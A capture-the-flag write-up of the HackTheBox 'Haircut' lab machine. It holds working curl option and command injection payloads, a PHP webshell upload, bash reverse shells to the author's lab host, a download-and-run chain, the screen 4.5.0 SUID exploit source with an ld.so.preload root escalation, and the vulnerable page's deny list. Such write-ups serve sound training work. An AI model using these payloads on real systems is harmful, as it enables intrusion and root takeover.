---
title: HTB: Haircut
url: https://0xdf.gitlab.io/2020/09/10/htb-haircut.html
date: 2020-09-10T09:00:00+00:00
difficulty: Medium [30]
os: Linux
tags: ctf, htb-haircut, hackthebox, nmap, php, upload, command-injection, parameter-injection, webshell, gobuster, curl, filter, screen, oscp-like-v2
---

![Haircut](https://0xdfimages.gitlab.io/img/haircut-cover.png)

Haircut started with some web enumeration where I’ll find a PHP site invoking curl. I’ll use parameter injection to write a webshell to the server and get execution. I’ll also enumerate the filters and find a way to get command execution in the page itself. To jump to root, I’ll identify a vulnerable version of screen that is set SUID (which is normal). I’ll walk through this exploit. In Beyond Root, I’ll take a quick look at the filtering put in place in the PHP page.

## Box Info

| Name | [Haircut](https://hackthebox.com/machines/haircut)  [Haircut](https://hackthebox.com/machines/haircut) [Play on HackTheBox](https://hackthebox.com/machines/haircut) |
| --- | --- |
| Release Date | 26 May 2017 |
| Retire Date | 30 Sep 2017 |
| OS | Linux Linux |
| Base Points | Medium [30] |
| Rated Difficulty | Rated difficulty for Haircut |
| Radar Graph | Radar chart for Haircut |
| First Blood User | 00:16:16[Mike2pointOh Mike2pointOh](https://app.hackthebox.com/users/450) |
| First Blood Root | 01:13:30[vamitrou vamitrou](https://app.hackthebox.com/users/1023) |
| Creator | [r00tkie r00tkie](https://app.hackthebox.com/users/462) |

## Recon

### nmap

`nmap` found two open TCP ports, SSH (22) and HTTP (80):

```

root@kali# nmap -p- --min-rate 10000 -oA scans/nmap-alltcp 10.10.10.24
Starting Nmap 7.80 ( https://nmap.org ) at 2020-09-03 15:51 EDT
Nmap scan report for 10.10.10.24
Host is up (0.017s latency).
Not shown: 65533 closed ports
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 7.67 seconds

root@kali# nmap -sC -sV -p 22,80 -oA scans/nmap-tcpscripts 10.10.10.24
Starting Nmap 7.80 ( https://nmap.org ) at 2020-09-03 15:51 EDT
Nmap scan report for 10.10.10.24
Host is up (0.015s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 e9:75:c1:e4:b3:63:3c:93:f2:c6:18:08:36:48:ce:36 (RSA)
|   256 87:00:ab:a9:8f:6f:4b:ba:fb:c6:7a:55:a8:60:b2:68 (ECDSA)
|_  256 b6:1b:5c:a9:26:5c:dc:61:b7:75:90:6c:88:51:6e:54 (ED25519)
80/tcp open  http    nginx 1.10.0 (Ubuntu)
|_http-server-header: nginx/1.10.0 (Ubuntu)
|_http-title:  HTB Hairdresser 
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 8.00 seconds

```

Based on the [OpenSSH](https://packages.ubuntu.com/search?keywords=openssh-server) version, the host is likely running Ubuntu 16.04 Xenial.

### Website - TCP 80

#### Site

The site just has a large image of a woman:

![image-20200903155703056](https://0xdfimages.gitlab.io/img/image-20200903155703056.png)

The HTML confirms that’s all there is here:

```

root@kali# curl http://10.10.10.24
<!DOCTYPE html>

<title> HTB Hairdresser </title>

<center> <br><br><br><br>
<img src="bounce.jpg" height="750" width="1200" alt="" />
<center>

```

#### Directory Brute Force

I’ll run `gobuster` against the site, and include `-x php` since these kinds of hosts often run PHP (especially in older boxes):

```

root@kali# gobuster dir -u http://10.10.10.24 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 40 -x php -o scans/go
buster-root-med-php
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.10.24
[+] Threads:        40
[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Extensions:     php
[+] Timeout:        10s
===============================================================
2020/09/03 19:55:45 Starting gobuster
===============================================================
/uploads (Status: 301)
/exposed.php (Status: 200)
===============================================================
2020/09/03 19:59:20 Finished
===============================================================

```

Those are both potentially interesting. Visiting `/uploads` just returns a 403 forbidden.

#### /exposed.php

This site has a place to enter a URL and a Go button:

![image-20200903160113525](https://0xdfimages.gitlab.io/img/image-20200903160113525.png)

If I submit the example URL, it returns stats about retrieving the page and what looks like a page:

![image-20200903160152560](https://0xdfimages.gitlab.io/img/image-20200903160152560.png)

I’ll check `http://10.10.10.24/test.html` ,and it is the same page that is displayed here.

Can it check pages on my host? I started a Python webserver and then entered `http://10.10.14.15/test.html` into the bar and hit submit:

![image-20200903160340485](https://0xdfimages.gitlab.io/img/image-20200903160340485.png)

The webserver shows the request and that it returned 404:

```

root@kali# python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.10.10.24 - - [03/Sep/2020 20:02:41] code 404, message File not found
10.10.10.24 - - [03/Sep/2020 20:02:41] "GET /test.html HTTP/1.1" 404 -

```

I tried a simple PHP script to see if the server would include the PHP and run it:

```

root@kali# echo '<?php echo "test\n"; ?>' > test.php

```

When I submitted this page into the form, I didn’t see `test` on the result. In the source, it was there:

```

<html>
	<head>
		<title>Hairdresser checker</title>
	</head>
	<body>
	<form action='exposed.php' method='POST'>
		<span>
		<p>
		Enter the Hairdresser's location you would like to check. Example: http://localhost/test.html
		</p>
		</span>
		<input type='text' name='formurl' id='formurl' width='50' value='http://localhost/test.html'/>
		<input type='submit' name='submit' value='Go' id='submit' />
	</form>
	<span>
		<p>Requesting Site...</p>  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed

  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0
100    24  100    24    0     0    815      0 --:--:-- --:--:-- --:--:--   827
<?php echo "test\n"; ?>
	</span>
	</body>
</html>

```

So the page is not running input collected via this method.

## Shell as www-data

### Identify Vulnerability

Looking back at the status messages being output to the screen, it reminded me of what `curl` prints when it’s output is piped to another process. For example, in this case I’ll just pipe to `tee /dev/null` (effectively doing nothing) to see the output:

```

root@kali# curl 10.10.10.24 | tee /dev/null
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100   144  100   144    0     0   5333      0 --:--:-- --:--:-- --:--:--  5333
<!DOCTYPE html>

<title> HTB Hairdresser </title>

<center> <br><br><br><br>
<img src="bounce.jpg" height="750" width="1200" alt="" />
<center>

```

My best guess at this point is that the PHP is doing something like:

```

if post
    system('curl ' . $POST["formurl"] . ' /path/to/some/directory')
end if

```

Depending on what level of filtering is going on (if any), that could be vulnerable to a command injection and/or parameter injection attacks.

### Filter Enumeration

The first thing I tried was to fetch `http://10.10.14.15/test.php; ping -c 1 10.10.14.15;`. The return shows that there’s some level of filtering going on:

```

	<span>
		<p>Requesting Site...</p>; is not a good thing to put in a URL	</span>

```

I found a handful of other characters that seem to set off the filter: `&|!#%[]{}`.

### Option Injection

If I’m going to have trouble running a different command, could I at least mess with `curl` by injecting options. If I send `http://10.10.14.15/test.php -b testcookie=testvalue`, I can watch on `nc` to see if the cookie is included in the request. It is:

```

root@kali# nc -lknvp 80
Ncat: Version 7.80 ( https://nmap.org/ncat )
Ncat: Listening on :::80
Ncat: Listening on 0.0.0.0:80
Ncat: Connection from 10.10.10.24.
Ncat: Connection from 10.10.10.24:48118.
GET /test.php HTTP/1.1
Host: 10.10.14.15
User-Agent: curl/7.47.0
Accept: */*
Cookie: test=test

```

I was successfully able to injection a `curl` option.

### Upload Webshell

Instead of a cookie, I’ll use `-o` to save the file on Haircut. I can save it into the `uploads` directory and see if it will run as PHP there. When I submit `http://10.10.14.15/cmd.php -o uploads/0xdf.php`, I only see the status come back:

![image-20200903165427061](https://0xdfimages.gitlab.io/img/image-20200903165427061.png)

When I check for my shell, it’s there:

```

root@kali# curl http://10.10.10.24/uploads/0xdf.php?cmd=id
uid=33(www-data) gid=33(www-data) groups=33(www-data)

```

### Shell

To go to a real shell, I’ll start `nc` and send that command to the webshell:

```

root@kali# curl -G http://10.10.10.24/uploads/0xdf.php --data-urlencode "cmd=bash -c 'bash -i >& /dev/tcp/10.10.14.15/443 0>&1'"

```

At a `nc` listener:

```

root@kali# nc -lnvp 443
Ncat: Version 7.80 ( https://nmap.org/ncat )
Ncat: Listening on :::443
Ncat: Listening on 0.0.0.0:443
Ncat: Connection from 10.10.10.24.
Ncat: Connection from 10.10.10.24:43828.
bash: cannot set terminal process group (1225): Inappropriate ioctl for device
bash: no job control in this shell
www-data@haircut:~/html/uploads$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)

```

### Alternative Injection

I noticed the none of ``$()` were triggering the filter, so I went for command injection that way as well. The `curl` command throws errors onto the page:

```

root@kali# curl http://10.10.10.24/exposed.php -d 'formurl=10.10.14.15/$(ping -c 1 10.10.14.15)&submit=go'
<html>
        <head>
                <title>Hairdresser checker</title>
        </head>
        <body>
        <form action='exposed.php' method='POST'>
                <span>
                <p>
                Enter the Hairdresser's location you would like to check. Example: http://localhost/test.html
                </p>
                </span>
                <input type='text' name='formurl' id='formurl' width='50' value='http://localhost/test.html'/>
                <input type='submit' name='submit' value='Go' id='submit' />
        </form>
        <span>
                <p>Requesting Site...</p>curl: option ---: is unknown
curl: try 'curl --help' or 'curl --manual' for more information
        </span>
        </body>
</html>

```

But at `tcpdump` I get pings:

```

root@kali# tcpdump -i tun0 icmp
tcpdump: verbose output suppressed, use -v or -vv for full protocol decode
listening on tun0, link-type RAW (Raw IP), capture size 262144 bytes
21:04:58.132878 IP 10.10.10.24 > 10.10.14.15: ICMP echo request, id 2117, seq 1, length 64
21:04:58.132924 IP 10.10.14.15 > 10.10.10.24: ICMP echo reply, id 2117, seq 1, length 64

```

Replacing `$([command])` with ``[command]`` also worked. All of the reverse shells I typically use contain other filtered characters. But I can use the command injection to upload a shell:

```

#!/bin/bash

bash -i >& /dev/tcp/10.10.14.15/443 0>&1

```

Now I’ll upload it to Haircut with:

```

root@kali# curl http://10.10.10.24/exposed.php --data-urlencode 'formurl=10.10.14.15/$(curl 10.10.14.15/shell.sh -o /tmp/0xdf)' --data-urlencode 'submit=go'

```

That will reach out to my webserver, download `shell.sh` to `/tmp/0xdf`. Now I’ll use the same technique to `chmod` to make the file executable:

```

root@kali# curl http://10.10.10.24/exposed.php --data-urlencode 'formurl=10.10.14.15/$(curl 10.10.14.15/shell.sh -o /tmp/0xdf)' --data-urlencode 'submit=go'

```

And one last time to run it:

```

root@kali# curl http://10.10.10.24/exposed.php --data-urlencode 'formurl=10.10.14.15/$(/tmp/rev)' --data-urlencode 'submit=go'

```

At `nc`:

```

root@kali# nc -lnvp 443
Ncat: Version 7.80 ( https://nmap.org/ncat )
Ncat: Listening on :::443
Ncat: Listening on 0.0.0.0:443
Ncat: Connection from 10.10.10.24.
Ncat: Connection from 10.10.10.24:43906.
bash: cannot set terminal process group (1225): Inappropriate ioctl for device
bash: no job control in this shell
www-data@haircut:~/html$

```

### user.txt

No matter how I get a shell, I can now grab `user.txt`:

```

www-data@haircut:/home/maria/Desktop$ cat user.txt
0b0da2af************************

```

## Shell as root

### Enumeration

In checking for SUID files, I found `/usr/bin/screen-4.5.0`:

```

www-data@haircut:~$ find / -perm -4000 -o -perm -2000 -type f 2>/dev/null    
/bin/ntfs-3g
/bin/ping6
/bin/fusermount
/bin/su
/bin/mount
/bin/ping
/bin/umount
/sbin/unix_chkpwd
/sbin/pam_extrausers_chkpwd
/usr/bin/sudo
/usr/bin/mlocate
/usr/bin/pkexec
/usr/bin/chage
/usr/bin/screen.old
/usr/bin/newuidmap
/usr/bin/crontab
/usr/bin/bsd-write
/usr/bin/newgrp
/usr/bin/newgidmap
/usr/bin/expiry
/usr/bin/gpasswd
/usr/bin/ssh-agent
/usr/bin/at
/usr/bin/passwd
/usr/bin/screen-4.5.0
/usr/bin/chsh
/usr/bin/wall
/usr/bin/chfn
/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
/usr/lib/x86_64-linux-gnu/utempter/utempter
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/snapd/snap-confine
/usr/lib/eject/dmcrypt-get-device
/usr/lib/openssh/ssh-keysign
/usr/lib/policykit-1/polkit-agent-helper-1

```

This jumped out to me because I ran into this during OSCP. There’s a [vulnerability](https://lists.gnu.org/archive/html/screen-devel/2017-01/msg00025.html) in SUID `screen` and it happens to be for that version.

### Exploit Details

In Screen version 4.5.0, if the user specifies a log file, the program will open and append to that log file. Because `screen` is typically set to SUID to function, that means write as root.

There is an [exploit in ExploitDB](https://www.exploit-db.com/exploits/41154) which consists of one long Bash script. I’ll break it into pieces to walk through it (some mods would need to be made anyway).

Most of the exploit is creating and compiling two binary files. First, it creates a shared object / library:

```

cat << EOF > /tmp/libhax.c
#include <stdio.h>
#include <sys/types.h>
#include <unistd.h>
__attribute__ ((__constructor__))
void dropshell(void){
    chown("/tmp/rootshell", 0, 0);
    chmod("/tmp/rootshell", 04755);
    unlink("/etc/ld.so.preload");
    printf("[+] done!\n");
}
EOF
gcc -fPIC -shared -ldl -o /tmp/libhax.so /tmp/libhax.c
rm -f /tmp/libhax.c

```

This library has a `dropshell` function that is marked as `__attribute__ ((__constructor__))`. [This means](https://gcc.gnu.org/onlinedocs/gcc-4.7.0/gcc/Function-Attributes.html#:~:text=The%20constructor%20attribute%20causes%20the,exit%20()%20has%20been%20called) it will run before execution enters main. It is very simple. It just changes the owner of `/tmp/rootshell` to root:root, then changes the permissions to be SUID, removes the file `/etc/ld.so.preload`, and prints a message. This code is compiled into `/tmp/libhax.so`

Next the script creates `/tmp/rootshell`:

```

cat << EOF > /tmp/rootshell.c
#include <stdio.h>
int main(void){
    setuid(0);
    setgid(0);
    seteuid(0);
    setegid(0);
    execvp("/bin/sh", NULL, NULL);
}
EOF
gcc -o /tmp/rootshell /tmp/rootshell.c
rm -f /tmp/rootshell.c

```

It simply sets all the user and group ids to root and runs `/bin/sh`.

Now to the exploit. It’ll move into `/etc`, and then run the following `screen` command:

```

screen -D -m -L ld.so.preload echo -ne  "\x0a/tmp/libhax.so" # newline needed

```

The options are as follows:
- `-D -m` - Start `screen` in “detached” mode, but don’t fork a new process, exiting when the session terminates
- `-L ld.so.preload` - turn on automatic output logging for the window
- `echo -ne "\x0a/tmp/libhax.so"` - command to run in the session, printing a newline followed by the path to the malicious library

So this will start screen output the path to the library, which will be logged to the `/etc/ld.so.preload` file, and then exit.

`/etc/ld.so.preload` holds a list of libraries that will attempt to be loaded each time any program is run. So the next time something runs as root, the malicious library will run as root. The script kicks that off by calling screen again:

```

screen -ls # screen itself is setuid, so... 

```

Finally, it will call the now SUID `/tmp/rootshell`.

### Run It

I tried to just upload the script to Haircut and run it, but it had some issue compiling things locally. I resorted to compiling locally on my host. I’ll create the two c files on my VM, and then compile them:

```

root@kali# gcc -fPIC -shared -ldl -o libhax.so libhax.c 
libhax.c: In function ‘dropshell’:
libhax.c:7:5: warning: implicit declaration of function ‘chmod’ [-Wimplicit-function-declaration]
    7 |     chmod("/tmp/rootshell", 04755);
      |     ^~~~~
root@kali# gcc -o rootshell rootshell.c 
rootshell.c: In function ‘main’:
rootshell.c:3:5: warning: implicit declaration of function ‘setuid’ [-Wimplicit-function-declaration]
    3 |     setuid(0);
      |     ^~~~~~
rootshell.c:4:5: warning: implicit declaration of function ‘setgid’ [-Wimplicit-function-declaration]
    4 |     setgid(0);
      |     ^~~~~~
rootshell.c:5:5: warning: implicit declaration of function ‘seteuid’ [-Wimplicit-function-declaration]
    5 |     seteuid(0);
      |     ^~~~~~~
rootshell.c:6:5: warning: implicit declaration of function ‘setegid’ [-Wimplicit-function-declaration]
    6 |     setegid(0);
      |     ^~~~~~~
rootshell.c:7:5: warning: implicit declaration of function ‘execvp’ [-Wimplicit-function-declaration]
    7 |     execvp("/bin/sh", NULL, NULL);
      |     ^~~~~~
rootshell.c:7:5: warning: too many arguments to built-in function ‘execvp’ expecting 2 [-Wbuiltin-declaration-mismatch]

```

There are some warnings, but both binaries exist:

```

root@kali# ls -l libhax.so rootshell
-rwxrwx--- 1 root vboxsf 16136 Sep  3 22:23 libhax.so
-rwxrwx--- 1 root vboxsf 16824 Sep  3 22:23 rootshell

```

I’ll upload both of those to `/tmp` on Haircut:

```

www-data@haircut:/tmp$ wget 10.10.14.15/libhax.so
--2020-09-04 04:26:26--  http://10.10.14.15/libhax.so
Connecting to 10.10.14.15:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 16136 (16K) [application/octet-stream]
Saving to: 'libhax.so'

libhax.so           100%[===================>]  15.76K  --.-KB/s    in 0.02s   

2020-09-04 04:26:26 (1013 KB/s) - 'libhax.so' saved [16136/16136]

www-data@haircut:/tmp$ wget 10.10.14.15/rootshell
--2020-09-04 04:26:30--  http://10.10.14.15/rootshell
Connecting to 10.10.14.15:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 16824 (16K) [application/octet-stream]
Saving to: 'rootshell'

rootshell           100%[===================>]  16.43K  --.-KB/s    in 0.02s   

2020-09-04 04:26:30 (1.04 MB/s) - 'rootshell' saved [16824/16824]

```

Now to execute, I’ll change into `/etc`, set the `umask`, and run `screen` (making sure to get the right one):

```

www-data@haircut:/tmp$ cd /etc/
www-data@haircut:/etc$ umask 000
www-data@haircut:/etc$ screen-4.5.0 -D -m -L ld.so.preload echo -ne  "\x0a/tmp/libhax.so" 

```

At this point, `ld.so.preload` should have the reference to `/tmp/libhax.so` (along with some other junk):

```

www-data@haircut:/etc$ cat ld.so.preload
' from /etc/ld.so.preload cannot be preloaded (cannot open shared object file): ignored.
[+] done!

/tmp/libhax.so

```

Now I’ll get root to run something by running `screen -ls`:

```

www-data@haircut:/etc$ screen-4.5.0 -ls
No Sockets found in /tmp/screens/S-www-data.

```

`ld.so.preload` has been cleaned up:

```

www-data@haircut:/etc$ ls ld.so.preload
ls: cannot access 'ld.so.preload': No such file or directory

```

And the `rootshell` is now SUID:

```

www-data@haircut:/etc$ ls -l /tmp/rootshell 
-rwsr-xr-x 1 root root 16824 Sep  4 04:23 /tmp/rootshell

```

I can get a shell as root:

```

www-data@haircut:/etc$ /tmp/rootshell 
# id
uid=0(root) gid=0(root) groups=0(root),33(www-data)

```

And print `root.txt`:

```

root@haircut:/root# cat root.txt
4cfa26d8************************

```

## Beyond Root

A quick check to see what the filtering actually was in `exposed.php`. The entire script was pretty short:

```

<html>
    <head>
    <title>Hairdresser checker</title>
    </head>
    <body>
    <form action='exposed.php' method='POST'>
    <span>
    <p>
    Enter the Hairdresser's location you would like to check. Example: http://localhost/test.html
                </p>
                </span>
                <input type='text' name='formurl' id='formurl' width='50' value='http://localhost/test.html'/>
<input type='submit' name='submit' value='Go' id='submit' />
    </form>
    <span>
    <?php 
    if(isset($_POST['formurl'])){
        echo "<p>Requesting Site...</p>"; 
        $userurl=$_POST['formurl'];
        $naughtyurl=0;
        $disallowed=array('%','!','|',';','python','nc','perl','bash','&','#','{','}','[',']');
        foreach($disallowed as $naughty){
            if(strpos($userurl,$naughty) !==false){
                echo $naughty.' is not a good thing to put in a URL';
                $naughtyurl=1;
            }
        }
        if($naughtyurl==0){
            echo shell_exec("curl ".$userurl." 2>&1"); 
        }
    }
?>
    </span>
    </body>
    </html>

```

The filtering comes down to not only a handful of characters (all of which I was able to identify), but also a few strings:

```

$disallowed=array('%','!','|',';','python','nc','perl','bash','&','#','{','}','[',']');

```

It will loop over these for each request, checking if it is in the user input. If it is found, `$naughty` is set to 1, and then `curl` isn’t run.

The `curl` looks much like I guessed, only it is using `echo shell_exec` rather than `system`.